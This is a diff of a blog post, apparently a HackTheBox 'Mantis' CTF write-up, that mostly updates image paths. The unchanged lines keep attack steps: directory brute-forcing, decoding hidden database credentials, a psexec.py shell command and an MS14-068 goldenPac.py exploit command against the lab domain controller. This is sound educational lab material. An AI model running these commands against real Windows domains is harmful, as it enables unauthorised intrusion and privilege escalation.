@@ -1,6 +1,9 @@
 ---
 layout: single
 title: "HackTheBox - Mantis writeup"
+header:
+  overlay_image: assets/img/thumbnails/htb.png
+  caption: "[__HackTheBox__](https://www.hackthebox.eu/)"
 author: V3ded
 comments: true
 ---
@@ -114,7 +117,7 @@ Right from the bat we can see multiple interesting services - `Kerberos(88), LDA
 ## Wasted (port: 1337)
 This port immediately grabbed my attention! It's sort of an infosec [pun](https://www.urbandictionary.com/define.php?term=1337) one could say :). Upon accessing the port we are present with a web server:
 
-<img src="/img/blog/htb-mantis/htb-mantis-01.png">
+<img src="assets/img/blog/htb-mantis/htb-mantis-01.png">
 
 Usual scans like nikto didn't yield much. Time to brute the directories:
 ```console
@@ -132,11 +135,11 @@ Gobuster v1.2                OJ Reeves (@TheColonial)
 http://10.10.10.52:8080/secure_notes (Status: 200)
 ```
 Secure_notes:
-<img src="/img/blog/htb-mantis/htb-mantis-02.png">
+<img src="assets/img/blog/htb-mantis/htb-mantis-02.png">
 
 Unfortunately web.config doesn't lead anywhere, it's just an empty page. However dev_notes do!
 dev_notes:
-<img src="/img/blog/htb-mantis/htb-mantis-03.png">
+<img src="assets/img/blog/htb-mantis/htb-mantis-03.png">
 
 Notice two alerting things:
 1. The actual filename - **dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt**
@@ -144,7 +147,7 @@ Notice two alerting things:
 
 Regarding point 1 - the filename looks suspicious. 2 file extensions and "random" gibberish as the name. If you look closely, you can spot that the name is base64 encoded. Proceed to it decode! `echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d`. This outputs `6d2424716c5f53405f504073735730726421`. That looks familiar as well, doesn't it? It's hex! Aaaand it decodes to `m$$ql_S@_P@ssW0rd!`. Wonderful! Onto the second point now. Simply scroll down the webpage.
 
-<img src="/img/blog/htb-mantis/htb-mantis-04.png">
+<img src="assets/img/blog/htb-mantis/htb-mantis-04.png">
 
 ```console
 Credentials stored in secure format
@@ -162,7 +165,7 @@ Let's save them and continue enumeration of other services.
 ## IIS (port: 8080)
 
 Accessing port 8080 we get this webpage: 
-<img src="/img/blog/htb-mantis/htb-mantis-05.png">
+<img src="assets/img/blog/htb-mantis/htb-mantis-05.png">
 *OrchardCMS*... Interesting. If you recall correctly, we discovered login credentials in the previous section. Let's try and find the administrator page.
 ```console
 root@EdgeOfNight:~/Desktop/Writeups/Mantis/Scans# gobuster -u http://10.10.10.52:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 25 -e
@@ -185,8 +188,8 @@ http://10.10.10.52:8080/pollArchive (Status: 200)
 ```
 
 `http://10.10.10.52:8080/admin (Status: 302)` - use `admin:@dm!n_P@ssW0rd!` credentials to login.
-<img src="/img/blog/htb-mantis/htb-mantis-06.png">
-<img src="/img/blog/htb-mantis/htb-mantis-07.png">
+<img src="assets/img/blog/htb-mantis/htb-mantis-06.png">
+<img src="assets/img/blog/htb-mantis/htb-mantis-07.png">
 
 Unfortunately I didn't find any useful information on here. Might as well be a rabbit hole...
 
@@ -195,10 +198,10 @@ This one is really simple. Just use the previously discovered credentials and sn
 > DBeaver can be installed with apt: apt-get install dbeaver 
 
 Add a new connection:
-<img src="/img/blog/htb-mantis/htb-mantis-08.png">
+<img src="assets/img/blog/htb-mantis/htb-mantis-08.png">
 
 Navigate through tables until you reach `UserPartRecord` (part of *orcharddb*) and view the data:
-<img src="/img/blog/htb-mantis/htb-mantis-09.png">
+<img src="assets/img/blog/htb-mantis/htb-mantis-09.png">
 
 A new username and a **cleartext** password! 
 * james@htb.local
@@ -220,7 +223,7 @@ I didn't notice this attack vector in my first attempt, BUT kudos to [ippsec](ht
 /usr/share/doc/python-impacket/examples/psexec.py htb.local/james@10.10.10.52
 ``` 
 
-<img src="/img/blog/htb-mantis/htb-mantis-10.png">
+<img src="assets/img/blog/htb-mantis/htb-mantis-10.png">
 
 ## Kerberos - MS14-068 
 For the sake of keeping this blog post short I won't describe the *"science"* behind this exploitation. It's really complex. Check the links below if you are interested in the actual explanation. 
@@ -262,7 +265,7 @@ Now run the exploit.
 ```console
 root@EdgeOfNight:~/Documents/Github/impacket/examples# python goldenPac.py -dc-ip 10.10.10.52 -target-ip 10.10.10.52 htb.local/james@mantis.htb.local
 ```
-<img src="/img/blog/htb-mantis/htb-mantis-11.png">
+<img src="assets/img/blog/htb-mantis/htb-mantis-11.png">
 
 ***
 ## Congratulations!
